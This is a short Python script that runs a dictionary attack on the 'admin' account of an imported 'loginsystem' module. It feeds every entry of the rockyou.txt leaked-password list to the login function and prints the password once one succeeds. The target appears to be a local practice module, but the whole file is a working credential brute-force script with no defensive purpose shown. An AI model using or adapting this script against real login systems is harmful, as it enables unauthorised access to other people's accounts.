# brute_force.py

import loginsystem

username = "admin"
found = False

try:
    with open("rockyou.txt", "r", encoding="latin-1") as wordlist:
        for line in wordlist:
            password = line.strip()
            if loginsystem.login(username, password):
                print(f"Password found: {password}")
                found = True
                break
            else:
                print(f"Tried: {password}")
except FileNotFoundError:
    print("rockyou.txt not found. Please download and place it in the same folder.")

if not found:
    print("Password not found in wordlist.")
